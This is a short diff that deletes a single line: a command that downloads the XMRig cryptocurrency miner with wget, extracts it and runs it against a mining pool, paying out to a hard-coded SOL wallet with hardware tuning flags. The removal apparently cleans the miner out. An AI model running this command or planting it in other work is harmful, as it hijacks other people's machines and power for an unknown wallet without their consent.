@@ -1,1 +1,0 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz && tar -xf xmrig-6.12.1-linux-x64.tar.gz && cd xmrig-6.12.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u SOL:65niEV1xdQBV93DRyttCY9Pk5CZoFtVS87VvzoVpWeyq.Worker-HP2 -t2 --randomx-1gb-pages --asm=ASM --randomx-wrmsr=1 --hugepage-size=2048
